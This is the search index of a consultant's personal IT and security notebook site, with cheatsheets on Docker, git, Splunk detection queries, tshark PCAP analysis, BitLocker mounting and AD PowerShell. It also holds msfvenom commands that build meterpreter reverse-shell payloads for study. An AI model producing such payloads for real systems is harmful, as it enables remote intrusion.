{"0": {
    "doc": "About",
    "title": "About",
    "content": "My name Jonathan. I am a cybersecurity consultant. This website is my IT notebook. Feel free send pull request through the github repository: [jomivz.github.io](https://github.com/jomivz/jomivz.github.io) Otherwise you can reach me on linkedin. Best regards ",
    "url": "/about/",
    "relUrl": "/about/"
  },"1": {
    "doc": "Development",
    "title": "Development",
    "content": " ",
    "url": "/docs/development/development.html",
    "relUrl": "/docs/development/development.html"
  },"2": {
    "doc": "docker",
    "title": "docker",
    "content": "# Docker QuickStart **Table of Contents** - [Images](#Images) - [Alpine](##Alpine) - [Ubuntu](##Ubuntu) - [The Docker Hub](#the-docker-hub) - [Configure Credential Help](#configure-credential-help) - [Building images](#building-images) - [Pushing images](#pushing-images) ## Images ### Alpine [Alpine](https://wiki.alpinelinux.org/wiki/Alpine_Linux_Init_System) ```sh apk install openrc ``` ### Ubuntu ## The Docker Hub ``` docker login ``` ## Configure credential help (https://github.com/docker/docker-credential-helpers/) (https://docs.docker.com/engine/reference/commandline/login/#credentials-store) Docker requires the helper program to be in the client’s host `$PATH`. ```sh docker pull alpine ``` ## Building images Start by creating a Dockerfile to specify your application as shown below: ```sh cat > Dockerfile /my-first-repo ``` Test your docker image locally by running: ```sh docker run /my-first-repo. docker run -i --expose=9999 b5593e60c33b bash docker run -d -p 5801:5801 -p 9999:9999 ..... ``` To push your Docker image to Docker Hub, run ```sh docker push /my-first-repo ``` Now, in Docker Hub, your repository should have a new latest tag available under Tags: ",
    "url": "/docs/system/docker-quickstart.html",
    "relUrl": "/docs/system/docker-quickstart.html"
  },"3": {
    "doc": "ELK",
    "title": "ELK",
    "content": " ",
    "url": "/docs/siem/elk.html",
    "relUrl": "/docs/siem/elk.html"
  },"4": {
    "doc": "Forensics",
    "title": "Forensics",
    "content": " ",
    "url": "/docs/forensics/forensics.html",
    "relUrl": "/docs/forensics/forensics.html"
  },"5": {
    "doc": "Git Quickstart",
    "title": "Git Quickstart",
    "content": "# GIT CheatSheez **Table content** - [Generate SSH keypair](#generate-ssh-keypair) - [Introduction](#introduction) - [Configure Git settings](#configure-git-settings) - [Working with repos](#working-with-repos) - [Ignoring content](#ignoring-content) - [Branches](#branches) - [Cleaning Repo](#cleaning-repo) Generate SSH keypair --------------------- ``` ssh-keygen -t rsa -b 4096 -C \"john@smith.fr\" eval \"$(ssh-agent -s)\" ssh-add ~/.ssh/id_rsa sudo apt install xclip xclip -sel clip ``` Working with repos --------------------- To create a repo, use the command below. It creates a ```.git``` directory in the repository for git metadata: ``` git init ``` To clone an existing repository ``` git clone ssh://user@domain.com/repo.git ``` Making changes, tracking and commiting its like this: ``` touch blob1.txt blob2.txt git add blob2.txt git status Sur la branche master Votre branche est à jour avec 'origin/master'. Modifications qui seront validées : (utilisez \"git reset HEAD ...\" pour désindexer) nouveau fichier : blob2.txt git reset HEAD blob2.txt git rm -f blob2.txt git commit -m \"some comments here\" git push origin master ``` Ignoring content --------------------- Binaries, compiled files might be not versionned. Disregard those files creating a ```.gitignore``` file: ``` *.o src/ **.cache/ **.jekyll-cache/ ``` Logging --------------------- ``` git log --oneline ``` Look at logs for a particular file ``` git log -- git log --oneline ``` Look at logs in a graphical way ``` git log --graph --decorate ``` Branches --------------------- Branches allows to create an effective copy of the master branch with a repository that worked with or without interfering with the master. This declutters the master branch. Create a branch: ``` git branch foo ``` Begin working in a new branch: ``` git checkout foo ``` Do both at once ``` git checkout -b foo ``` Pushes and Merges --------------------- Push one or all branches to the origin: ``` git push origin git push origin --all ``` Merge a branch with HEAD on the master branch: ``` git checkout branch git merge foo ``` Cleaning repo --------------------- Steps to remove folder/directory only from git repository and not from the local : ``` git rm -r --cached FolderName git commit -m \"Removed folder from repository\" git push origin master ``` ",
    "url": "/docs/development/git/",
    "relUrl": "/docs/development/git/"
  },"6": {
    "doc": "gpg",
    "title": "gpg",
    "content": "Check using Repository GPG Keys (secure) -------------------------------------------- This method verifies the hashes published by Canonical are actually authentic. Unlike performing a quick checksum, the SHA256SUMS file is signed and only Ubuntu’s key can unlock the file to reveal the checksums exactly as Ubuntu published them. Ubuntu Download a copy of the SHA256SUMS and SHA256SUMS.gpg files from Canonical’s CD Images server for that particular version. Install the Ubuntu Keyring. This may already be present on your system. ``` sudo apt-get install ubuntu-keyring ``` Verify the keyring. ``` gpgv --keyring=/usr/share/keyrings/ubuntu-archive-keyring.gpg SHA256SUMS.gpg SHA256SUMS ``` Verify the checksum of the downloaded image. ``` grep ubuntu-mate-18.04-desktop-amd64.iso SHA256SUMS | sha256sum --check ``` If you see “OK”, the image is in good condition. ``` ubuntu-mate-18.04-desktop-amd64.iso: OK ``` ",
    "url": "/docs/system/gpg.html",
    "relUrl": "/docs/system/gpg.html"
  },"7": {
    "doc": "Cheatsheets",
    "title": "Cheatsheets",
    "content": " ",
    "url": "/docs/",
    "relUrl": "/docs/"
  },"8": {
    "doc": "Home",
    "title": "Home",
    "content": "# What is this? This is publicly accessible personal mindmaps and notes at [www.jmvwork.xyz](https://jmvwork.xyz) about my IT experiments in networking and system administration, forensics and pentesting. Using markdown as notes allows to fetch commands (using ```grep``` plus keywords) in order to be the more efficient in several situations... Like administrating, deploying, maintaining, auditing, investigating, passing exam or participating to a CTF. * Do not take everything or anything in these notes for **granted** * Do not expect the notes to be exhaustive or covering the techniques or the artifacts they produce in full * Expect mistakes in the notes * Always consult additional resources My notes will cover my training roadmap : * CRTP (Certified Red Team Professional) by [pentesteracademy.com](https://www.pentesteracademy.com/activedirectorylab) * Good start to know Windows/Active Directory TTPs * [tryhackme.com](https://tryhackme.com) * Good start to practice cybersecurity classic topics * [letsdefend.io](https://letsdefend.io) * Not tried yet - stay tuned * DFIR free training at [dfirdiva.com](https://freetraining.dfirdiva.com) * Not tried yet - stay tuned * [chiheb-chebbi.com](https://www.chiheb-chebbi.com) * Not tried yet - stay tuned * OSCP (Offensive Security Certified Professional) by [offensive-security.com](https://www.offensive-security.com/pwk-oscp/) * The best certification to start infrastructure security audit as a professional * CCNP Routing & Switching (Cisco Certified Network Professional) - passed in 2014 - by Cisco * Certification on the path to become an expert. Gaps are huge between the CCNA, the CCNP and the CCIE. Cheatsheets might be not updated. * Encase Certified Examinor - writing passed 2016 - by Guidance / Opentext * Definitely not an EDR, but a leader on the market to investigate Windows OS, NTFS and blob You may also be interested into my cybersecurity PDFs collection at: [github.com/jomivz/cybrary](https://github.com/jomivz/cybrary). This website is inspired by more advance projects I recommend you to have a look : * [ired.team repository](https://ired.team): common offensive security techniques * [Project wadcoms](https://wadcoms.github.io): Windows/AD offensive security techniques * [Project LOLBAS](https://lolbas-project.github.io): Windows LOLBAS offensive security techniques used for download, execute and bypass * [Project GTFO](https://gtfobins.github.io): Linux GTFO offensive security techniques used for download, execute and bypass It is propulsed by [github pages](https://pages.github.com/) allowing to build a website based on markdown files. Sources files are available at the repository: [github.com/jomivz/jomivz.github.io](https://github.com/jomivz/jomivz.github.io). Most of my notes are discovered by other security researchers and I do not claim their ownership. I try to reference the sources I use the best I can, but if you think I've missed something, please get in touch and I will fix it immediately. ",
    "url": "/",
    "relUrl": "/"
  },"9": {
    "doc": "iptables",
    "title": "iptables",
    "content": "# IPTABLES cheatsheez 4 UBUNTU ## Pre-requisites Install the following package: ```sh apt install iptables-persistent ``` ## Saving & persistency Save the current config running this CLI: ```sh iptables-save > /etc/iptables.rules cd /etc/rc0.d; ln -s ../iptables.rules K01iptables ``` Execute the following command to restore the config ```iptables.rules``` after changes: ```sh iptables-restore ``` ",
    "url": "/docs/networking/iptables.html",
    "relUrl": "/docs/networking/iptables.html"
  },"10": {
    "doc": "verifying linux boot binaries",
    "title": "verifying linux boot binaries",
    "content": "1. To create the checksum file, run the command: ``` find isolinux/ -type f -exec b2sum -b -l 256 {} \\; > isolinux.blake2sum_l256 ``` 2. To check binaries against the checksum file, run the command: ``` b2sum -c \"${dirname}\".blake2sum_l256 ``` ",
    "url": "/docs/forensics/lin-check-boot-binaries.html",
    "relUrl": "/docs/forensics/lin-check-boot-binaries.html"
  },"11": {
    "doc": "linux command examples - find",
    "title": "linux command examples - find",
    "content": "Linux command examples - find -------------------------------------------- Finding pdf files created las 24 hours in Downloads direectory: ``` find ~/Dowloads -iname *.pdf -a -ctime 1 ``` ``` find / -perm +6000 -type f -exec ls -ld {} \\; > setuid.txt & find / -perm +4000 -user root -type f - ``` ",
    "url": "/docs/system/lin-find.html",
    "relUrl": "/docs/system/lin-find.html"
  },"12": {
    "doc": "linux command examples - gpgv",
    "title": "linux command examples - gpgv",
    "content": "Linux command examples - gpgv -------------------------------------------- This method verifies the hashes published by Canonical are actually authentic. Unlike performing a quick checksum, the SHA256SUMS file is signed and only Ubuntu’s key can unlock the file to reveal the checksums exactly as Ubuntu published them. Ubuntu Download a copy of the SHA256SUMS and SHA256SUMS.gpg files from Canonical’s CD Images server for that particular version. Install the Ubuntu Keyring. This may already be present on your system. ``` sudo apt-get install ubuntu-keyring ``` Verify the keyring. ``` gpgv --keyring=/usr/share/keyrings/ubuntu-archive-keyring.gpg SHA256SUMS.gpg SHA256SUMS ``` Verify the checksum of the downloaded image. ``` grep ubuntu-mate-18.04-desktop-amd64.iso SHA256SUMS | sha256sum --check ``` If you see “OK”, the image is in good condition. ``` ubuntu-mate-18.04-desktop-amd64.iso: OK ``` ",
    "url": "/docs/system/lin-gpg.html",
    "relUrl": "/docs/system/lin-gpg.html"
  },"13": {
    "doc": "linux command examples - lsof",
    "title": "linux command examples - lsof",
    "content": "Linux command examples - lsof -------------------------------------------- ``` ``` ",
    "url": "/docs/system/lin-lsof.html",
    "relUrl": "/docs/system/lin-lsof.html"
  },"14": {
    "doc": "linux misc commands",
    "title": "linux misc commands",
    "content": "Useful daily linux CLI: Pushing a command output to pastebin (example here ```ps```): ``` ps -aux |pastebinit ``` Displaying a markdown to lynx: ``` pandoc docker.md | lynx -stdin ``` Aggregating multiple pdf files : ``` pdfunite infile1.pdf infile2.pdf outfile.pdf ``` To resize an image, use the command: ``` convert -resize 50% source.png dest.jpg convert logo.png -resize 512x512 output.png ``` Check out [imagemagick resize examples](https://legacy.imagemagick.org/Usage/resize/) illustrated. Linux command examples : find To find pdf files created last 24 hours in Donwloads diirectory, use the command: ``` find ~/Downloads -iname *.pdf -a -ctime 1 ``` To convert all pdf files in current directory to ebooks, use the commannd: ``` for src in *.pdf; do sudo ebook-convert $src .mobi; done ``` To create a favicon with ```ImageMagick```, use the command: ``` convert logo.png -background white -clone 0 -resize 32x32 -extent 32x32 -delete 0 -alpha off -colors 256 favicon.ico ``` To convert a bmp image to an svg, use the command: ``` potrace -s logo.bmp #replace the white zone with transparency\" potrace -s logo.bmp --fillcolor \"#fffffff\" #to keep white areas potrace -s logo.bmp --opaque #to keep white areas ``` ",
    "url": "/docs/system/lin-misc-cli.html",
    "relUrl": "/docs/system/lin-misc-cli.html"
  },"15": {
    "doc": "mounting bitlocker partition on Linux",
    "title": "mounting bitlocker partition on Linux",
    "content": "The bitlocker Key is 48 digits long. ``` root@kali:~# dislocker -v -V /dev/sdb1 -p123456-123456-123456-123456-123456-123456-123456-123456 -- /mnt/tmp root@kali:~# ls /mnt/tmp/ dislocker-file root@kali:~# mount -o loop,ro /mnt/tmp/dislocker-file /mnt/dis root@kali:~# ls /mnt/dis/ ``` ",
    "url": "/docs/forensics/lin-mount-part-bitlocker.html",
    "relUrl": "/docs/forensics/lin-mount-part-bitlocker.html"
  },"16": {
    "doc": "Linux",
    "title": "Linux",
    "content": " ",
    "url": "/docs/system/linux.html",
    "relUrl": "/docs/system/linux.html"
  },"17": {
    "doc": "Mindmaps",
    "title": "Mindmaps",
    "content": "# Mindmaps **Table of Contents** - [Forensics Roadmap for NTFS](#forensics-roadmap-for-ntfs) - [Forensics Roadmap for Windows OS](#forensics-roadmap-for-windows-os) - [EnCE Encase v7](#ence-encase-v7) - [Encase v7 Enscripts](#encase-v7-enscripts) - [Encase v7 Products](#encase-v7-products) ## Forensics Roadmap for NTFS ![Forensics Roadmap for NTFS](/docs/mindmaps/svg/win-for-ntfs.svg) ## Forensics Roadmap for Windows OS ![Forensics Roadmap for Windows](/docs/mindmaps/svg/win-for-invest-roadmap.svg) ## EnCE Encase v7 ![EnCE Encase v7](/docs/mindmaps/svg/win-for-encase-v7-ence.svg) ## Encase v7 Enscripts ![Encase v7 EnScripts](/docs/mindmaps/svg/win-for-encase-v7-enscript.svg) ## Encase v7 Products ![Encase v7 Products](/docs/mindmaps/svg/win-for-encase-products-2016.svg) ",
    "url": "/docs/mindmaps/mindmaps.html",
    "relUrl": "/docs/mindmaps/mindmaps.html"
  },"18": {
    "doc": "Miscellaneous",
    "title": "Miscellaneous",
    "content": "ps -aux |pastebinit pandoc docker.md | lynx -stdin pdfunite infile1.pdf infile2.pdf outfile.pdf convert -resize 50% source.png dest.jpg convert -resize 512x512\\> secureelance_purple_484x512.png output.png file output.png output.png: PNG image data, 484 x 512, 8-bit/color RGBA, non-interlaced ",
    "url": "/docs/system/miscellaneous.html",
    "relUrl": "/docs/system/miscellaneous.html"
  },"19": {
    "doc": "Networking",
    "title": "Networking",
    "content": " ",
    "url": "/docs/networking/networking.html",
    "relUrl": "/docs/networking/networking.html"
  },"20": {
    "doc": "linux sambacry",
    "title": "linux sambacry",
    "content": "CVE ID : CVE-2017-7494 Date: 01/06/2017 https://github.com/ptresearch/AttackDetection/blob/master/CVE-2017-7494/CVE-2017-7494.rules ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_1.png) ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_2.png) ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_3.png) ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_4.png) ",
    "url": "/docs/pentest/pen-lin-smb-rce-2017-7494.html",
    "relUrl": "/docs/pentest/pen-lin-smb-rce-2017-7494.html"
  },"21": {
    "doc": "msfvenom payload",
    "title": "msfvenom payload",
    "content": "Generating payload with msfvenom either a dll or an executable file: ``` msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll ``` ",
    "url": "/docs/pentest/pen-payload-msfvenom.html",
    "relUrl": "/docs/pentest/pen-payload-msfvenom.html"
  },"22": {
    "doc": "Pentest",
    "title": "Pentest",
    "content": " ",
    "url": "/docs/pentest/pentest.html",
    "relUrl": "/docs/pentest/pentest.html"
  },"23": {
    "doc": "pfsense",
    "title": "pfsense",
    "content": "Check pfsense firmware version and the corresponding FreeBSD version here: https://docs.netgate.com/pfsense/en/latest/releases/versions-of-pfsense-and-freebsd.html After installing (setting vmx0 vlan and IP address + webconfigurator http protocol), log as admin and password pfsense: https://docs.netgate.com/pfsense/en/latest/usermanager/pfsense-default-username-and-password.html ",
    "url": "/docs/networking/pfsense.html",
    "relUrl": "/docs/networking/pfsense.html"
  },"24": {
    "doc": "QRadar",
    "title": "QRadar",
    "content": " ",
    "url": "/docs/siem/qradar.html",
    "relUrl": "/docs/siem/qradar.html"
  },"25": {
    "doc": "SIEM",
    "title": "SIEM",
    "content": " ",
    "url": "/docs/siem/siem.html",
    "relUrl": "/docs/siem/siem.html"
  },"26": {
    "doc": "splunk queries by ip",
    "title": "splunk queries by ip",
    "content": "# Splunk Queries by IP **Table of Contents** - [Windows queries ](##windows-queries) - [Windows domain controller 1 ](##windows-dc-1) - [Windows domain controller 2 ](##windows-dc-2) - [Suricata queries ](##suricata-queries) - [Suricata: Alertes IDS](##suricata:-alertes-ids) - [Suricata: Alertes IDS par IP source et destination 1](##suricata-alertes-ids-par-ip-source-et-destination-1) - [Suricata: Alertes IDS par IP source et destination 2](##suricata:-alertes-ids-par-ip-source-et-destination-2) - [Suricata: Répartition des User-agents HTTP dans le temps](##suricata:repartition-des-user-agents-htt-dans-le-temps) - [Suricata: Téléchargement de fichiers en HTTP dans le temps](##suricata:-telechargement-de-fichiers-en-htt-dans-le-temps) ## Windows queries Windows DC 1: ``` host=10.2.3..5 Source_Network_Address=* Logon_Type=3 (EventCode=4624 OR EventCode=4625) $addr_ip$ | fields Security_ID, Source_Network_Address, host, EventCode | lookup reversedns ip as Source_Network_Address | lookup wineventcode.csv code as EventCode OUTPUT description as Description | stats count by Security_ID, Source_Network_Address, EventCode, host, Description | table Security_ID, Source_Network_Address, host, EventCode, Description, count | sort -count | rename Source_Network_Address as \"Adresse IP Source\", count as \"Nb événements\", host as \"Nom de l'hôte\" ``` Windows DC 2: ``` host=10.2.3.5 (Source_Address=* OR Destination_Address=*) EventCode=515* $addr_ip$ | fields Source_Address, Source_Port, Destination_Address, Destination_Port,EventCode, Layer_Name | lookup reversedns ip as Destination_Address OUTPUT host as host_dst | lookup reversedns ip as Source_Address OUTPUT host as host_src | lookup wineventcode.csv code as EventCode OUTPUT description as Description | rename Source_Port as service | rename Destination_Port as service | where service=3389 OR service&lt;1024 | stats count by Source_Address, Destination_Address, service, EventCode, Layer_Name, host_src, host_dst, Description | table Source_Address, host_src, Destination_Address, host_dst, service, EventCode, Description, Layer_Name, count | sort -count | rename Source_Address as \"Adresse IP Source\", Destination_Address as \"Adresse IP Destination\", service as Service, Layer_Name as \"Action\", count as \"Nb événements\", host_dst as \"Nom de l'hôte destination\", host_src as \"Nom de l'hôte source\", host_dst as \"Nom de l'hôte destination\" ``` Windows DC: Succès d'authentifications dans le temps ``` host=10.2.3.5 Source_Network_Address=* Logon_Type=3 (EventCode=4624) $addr_ip$ | fields Security_ID, EventCode | timechart count(EventCode) by Security_ID ``` Windows DC: Echecs d'authentifications dans le temps ``` host=10.2.3.5 Source_Network_Address=* Logon_Type=3 (EventCode=4625) $addr_ip$ | fields Security_ID, EventCode | timechart count(EventCode) by Security_ID ``` Windows DC: Filtrage réseau ``` host=10.2.3.5 (Source_Address=$addr_ip$ OR Destination_Address=$addr_ip$) EventCode=515* | fields Source_Address, Source_Port, Destination_Address, Destination_Port,EventCode | cluster showcount=t | table cluster_count Source_Port, Source_Address, EventCode, Destination_Address, Destination_Port ``` ## Suricata queries ### Suricata: Alertes IDS ``` index=suricata $addr_ip$ | dedup src_ip dest_ip alert.signature | search alert.signature!=\"\" | lookup reversedns ip as dest_ip OUTPUT host as host_dst | lookup reversedns ip as src_ip OUTPUT host as host_src | table _time, src_ip, host_src, src_port, dest_ip, host_dst, dest_port, alert.signature | rename alert.signature as Signature, src_ip as \"Source IP\", dest_ip as \"Destination IP\", src_port as \"Source port\", dest_port as \"Destination port\", host_src as \"Nom de l'hôte source\", host_dst as \"Nom de l'hôte destination\" ``` ### Suricata: Alertes IDS par User-agents ``` index=suricata src_ip=$addr_ip$ | fields http.http_user_agent, src_ip, flow_id, dest_ip | rename http.http_user_agent as http_user_agent | lookup user_agents http_user_agent | search ua_os_family!=unknown | stats count(flow_id) as \"Flow\" by ua_family, ua_os_family, src_ip, dest_ip | table src_ip, ua_family, ua_os_family, dest_ip, Flow | rename ua_family as Navigateurs, ua_os_family as OS, Flow as \"Nb trafics\", src_ip as \"IP Sources\", dest_ip as \"IP Destinations\" ``` ### Suricata: Alertes IDS par IP source et destination 1 ``` index=suricata (src_ip=$addr_ip$) | fields src_ip, dest_ip, alert.signature | search alert.signature!=\"\" | rename alert.signature as signature | cluster showcount=t | table cluster_count src_ip dest_ip signature ``` ### Suricata: Alertes IDS par IP source et destination 2 ``` index=suricata $addr_ip$ | search alert.signature!=\"\" | rename alert.signature as Signature | iplocation src_ip | stats count by Signature, src_ip, dest_ip | table src_ip, dest_ip, Signature, count | rename src_ip as \"Source IP\", dest_ip as \"Destination IP\", src_port as \"Source port\", dest_port as \"Destination port\", count as \"Nb déclenchement signature\" ``` ### Suricata: Répartition des User-agents HTTP dans le temps ``` index=suricata src_ip=$addr_ip$ | fields http.http_user_agent, src_ip, flow_id, dest_ip | rename http.http_user_agent as http_user_agent | lookup user_agents http_user_agent | timechart count(flow_id) as \"Flow\" by http_user_agent ``` ### Suricata: Téléchargement de fichiers en HTTP dans le temps ``` index=suricata event_type=fileinfo fileinfo.filename!=*/centreon/* fileinfo.filename!=\"/\" fileinfo.filename!=*allmetrics* http.hostname!=*sophosupd.com http.hostname!=*.acme.fr http.hostname!=*.microsoft.com http.hostname!=\"dci.sophosupd.net\" http.hostname!=*.zscaler.net http.hostname!=*.digicert.com http.hostname!=download.windowsupdate.com http.hostname!=*.firefox.com fileinfo.magic!=\"ASCII text, with no line terminators\" $addr_ip$ | timechart count(fileinfo.size) by http.hostname ``` ",
    "url": "/docs/siem/splunk-queries-by-ip.html",
    "relUrl": "/docs/siem/splunk-queries-by-ip.html"
  },"27": {
    "doc": "splunk queries by user",
    "title": "splunk queries by user",
    "content": "# Splunk Queries by user **Table of Contents** - [Splunk queries by user](#splunk-queries-by-user) - [O365: emails bloques](#o365:-emails-bloques#) - [Windows: acces aux partages](#windows:-acces-aux-partages) - [Windows: acces aux partages à privilèges](#windows:-acces-aux-partages-a-privileges) ## Splunk Queries by user ### O365: mails entrants bloqués ``` sourcetype=\"ms:o365:reporting:messagetrace\" (action=FilteredAsSpam OR action=quarantained) RecipientAddress=$user_account$@acme.fr | fields FromIP, Subject, SenderAddress, Country, City | stats count(Subject) as nbmail by FromIP, Subject, SenderAddress | sort -nbmail | iplocation FromIP | table nbmail, FromIP, Country, City, SenderAddress, Subject ``` Windows: accès aux partages ``` host=10.1.2.5 Account_Name=$user_account$ EventCode=4728 | table ComputerName, Group_Name, Account_Name, EventCode | rename ComputerName as \"Serveur AD\", Group_Name as \"Groupe Administrateur modifié\", Account_Name as \"Administrateur responsable de la modification \\r\\n Compte rajouté\" ``` Windows Accès aux partages à privilège: C$, ADMIN$ ``` host=10.1.2.5 EventCode=5145 (Share_Name=\"*\\\\C$$\" OR Share_Name=\"*\\\\Admin$$\") Account_Name=$user_account$ | timechart count by Account_Name ``` ",
    "url": "/docs/siem/splunk-queries-by-user.html",
    "relUrl": "/docs/siem/splunk-queries-by-user.html"
  },"28": {
    "doc": "splunk quickstart",
    "title": "splunk quickstart",
    "content": "# Splunk QuickStart **Table of Contents** - [Platform health monitoring](#platform-health-monitoring) - [Dashboards](##dashboards) ## Platform health monitoring ![Splunk health monitoring](/docs/siem/splunk-health-monitoring.png) Format: ![Alt Splunk health monitoring](/docs/siem/splunk-health-monitoring.png) ### Dashboards here: here: here: [XXX](https://wiki.org/wiki/) ",
    "url": "/docs/siem/splunk.html",
    "relUrl": "/docs/siem/splunk.html"
  },"29": {
    "doc": "System",
    "title": "System",
    "content": " ",
    "url": "/docs/system/system.html",
    "relUrl": "/docs/system/system.html"
  },"30": {
    "doc": "tshark",
    "title": "tshark",
    "content": "# PCAP analysis with TSHARK ## Extract asset: IP list, HTTP hotsnames Extract of HTTP host to CSV : ``` tshark -nl -T fields -e ip.src -e ip.dst -e http.host -r request_1426258128.pcap | sort | uniq > 2389_http_streams.csv ``` Extract of source and destination IP addresses to CSV : ``` tshark -nl -T fields -e ip.src -e ip.dst -r request_1426258128.pcap | sort | uniq > 2389_ip_streams.csv ``` Extract in-addr.arpa in DNS PTR response to CSV : ``` tshark -nl -T fields -e dns.qry.name -r request_1426258128.pcap | sort | uniq > 2389_dns_ptr_C2_response.csv 139.253.2.195.in-addr.arpa 166.119.19.193.in-addr.arpa ``` Cast in-addr.arpa to IPv4 : ``` cat 2389_dns_ptr_C2_response.csv | arpa2ip 195.2.253.139 193.19.119.166 ``` Cast IPv4 set to tcpdump list : ``` cat 2389_DNS_ptr_C2_ip.csv | tcplist '( 195.88.208.131 or 195.2.253.139 or 193.19.119.166 or 195.88.209.169 or 195.2.253.204 or 195.88.208.250 or 193.19.118.27 or 195.2.252.44 or 195.88.208.56 or 195.88.209.6 or 193.19.118.94 )' ``` Match in wireshark packets with Sourcefire IOC strings In the example here, convert the string () { (shellshock) to hexadecimal value (NOTE: skip 0a which is the EOF) ``` [19:27:16] jomivz@sans-sift:1793 $ echo () { > ioc.ascii [19:27:23] jomivz@sans-sift:1793 $ xxd ioc.ascii 0000000: 2829 207b 0a () {. [19:27:28] jomivz@csirt-sans-sift:1793 $ ``` Apply the related BFP filter in Wireshark : ``` tcp.segment_data contains 28:29:20:7b ``` Look for IP asset in CDA list ``` cat 1793_ip_streams_dstip_AL.csv| greplist | grep -f /assets/CDA_sorted_IP.txt ``` Tcpdump capture from IP asset Capture_on_IDS with the tcpdump list ``` root@SF-SENSOR:/Volume/home/admin# tcpdump -i nfe0.1.22 -c 1000 host '( 195.88.208.131 or 195.2.253.139 or 193.19.119.166 or 195.88.209.169 or 195.2.53.204 or 195.88.208.250 or 193.19.118.27 or 195.2.252.44 or 195.88.208.56 or 195.88.209.6 or 193.19.118.94 )' -w 2389_2.pcap ``` ",
    "url": "/docs/networking/tshark.html",
    "relUrl": "/docs/networking/tshark.html"
  },"31": {
    "doc": "memory dump virtualbox",
    "title": "memory dump virtualbox",
    "content": "# Dumping Memory of a VirtualBox Machine Launch the VM in debug mode using CLI : ``` > vboxmanage list vms > virtualbox --dbg --startvm ``` Click on the \"Debug\" menu -> \"Command line...\". VBoxDbg > .pgmphystofile .mm ",
    "url": "/docs/forensics/vbox-dump-memory.html",
    "relUrl": "/docs/forensics/vbox-dump-memory.html"
  },"32": {
    "doc": "mounting bitlocker partition on Windows",
    "title": "mounting bitlocker partition on Windows",
    "content": "Mounting BitLocker Encrypted Drive on Windows # Convert Raw Image Files to VHD Compatible File Virtual Hard Disk (VHD) tool is an unmanaged code command-line tool which provides useful VHD manipulation functions including instant creation of large fixed-size VHDs. VHD Tool 2.0 tool can be obtained from either of the below sources: http://archive.msdn.microsoft.com/vhdtool/Release/ProjectReleases.aspx?ReleaseId=5344 # VHD Tool 2.0 Usage 1. Download the VhdTool.exe to D:\\. 2. Open an elevated command prompt and navigate to D:\\. 3. Execute the following command: VhdTool.exe /convert raw_disk_image_filename.ntfs. # Mount VHD via Windows Disk Management Tool 1. Open Disk Management via Start > Run > diskmgmt.msc. 2. On the Menu bar, Action > Attach VHD. 3. Browse to the location of the raw disk image folder. Ensure that All files (*.*) is selected. NOTE: Do not checked Read-only else even when the correct recovery key is entered later on, it will alert you that it is incorrect.[2] 4. Select Type the recovery key when prompted. 5. Enter the recovery key and click NEXT. NOTE: Every recovery key has a password ID. Ensure that the recovery key entered is for the password ID shown to you. # Unmount VHD via Windows Disk Management Tool 1. Right click on the mounted VHD and click on Detach VHD. On “acme.corp”, right click and choose “Find” Choose “Computer”, type the computer name, click on “Find Now”. On section “Search Results”, pick the computer. Go to “BitLocker Recovery” tab to retrieve BitLocker Recovery Password ",
    "url": "/docs/forensics/win-mount-part-bitlocker.html",
    "relUrl": "/docs/forensics/win-mount-part-bitlocker.html"
  },"33": {
    "doc": "PS group listing to CSV",
    "title": "PS group listing to CSV",
    "content": "PS script for detailled listing of Group Members --------------------------------------------- ``` Get-ADgroup EMEA-PXY-Web-ReadWrite -Property * | Select-Object -ExpandProperty Members Get-ADgroup EMEA-PXY-Web-ReadWriteUpload -Property * | Select-Object -ExpandProperty Members import-module activeDirectory $GroupMember = \"EMEA-PXY-Web-ReadWriteUpload\" $ResultFileName = \"C:\\Users\\x123456\\Documents\\EMEA-PXY-Web-ReadWriteUpload.csv\" $Members=Get-ADGroupMember -identity $GroupMember -recursive $Result = @(); foreach ($Member in $Members){ $User = Get-ADObject $Member -Properties name,displayName,department; $result += New-object -TypeName psobject -Property @{ 'Compte AD'=$User.name; 'Nom Prenom'=$User.displayName; 'Direction-Service'=$User.department; } } $Result|Export-csv -path $ResultFileName -delimiter ';' -NoTypeInformation -Encoding UTF8 -Force; Type $ResultFileName ``` ",
    "url": "/docs/system/win-ps-group-listing-to-csv.html",
    "relUrl": "/docs/system/win-ps-group-listing-to-csv.html"
  },"34": {
    "doc": "PS useful queries",
    "title": "PS useful queries",
    "content": "PS sysadmin useful queries ----------------------------------------------- * Installing telnet clients : ``` Import-module servermanager Add-windowsfeature telnet-client ``` * ActiveDirectory module mandatory for the following commands : ``` Import-module ActiveDirectory ``` * Listing User Groups : ``` Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf ``` * Listing Group Members : ``` Get-ADGroup EMEA-PXY-Web-ReadWrite -Property * | Select-Object -ExpandProperty Member ``` * PasswordLastSet : ``` Get-ADUser 'x123456' -properties PasswordLastSet | Format-List ``` * Matching Group Name for USB : ``` Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf | findstr 'DEVICECONTROL' ``` * Matching Group Name for DA : ``` Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf | findstr 'Domain Admins' ``` * Matching Group Name 2 : ``` Get-ADPrincipalGroupMembership -Identity x123456 | Select-Object -ExpandProperty MemberOf | Where-Object {$_.name -like '*DEVICECONTROL*' } ``` * Listing Computer Info : ``` Get-ADComputer -Filter {Name -Like \"dell-xps*\"} -Property * | Format-Table Name,OperatingSystem,OperatingSystemServicePack,OperatingSystemVersion -Wrap -Auto ``` * Listing Win > 6.1 : ``` Get-ADComputer -Filter {OperatingSystemVersion -ge \"6.1\"} -Property * | Format-Table Name,OperatingSystem,OperatingSystemVersion -Wrap -Auto ``` ",
    "url": "/docs/system/win-ps-useful-queries.html",
    "relUrl": "/docs/system/win-ps-useful-queries.html"
  },"35": {
    "doc": "Windows",
    "title": "Windows",
    "content": " ",
    "url": "/docs/system/windows.html",
    "relUrl": "/docs/system/windows.html"
  },"36": {
    "doc": "wordpress XSS injection",
    "title": "wordpress XSS injection",
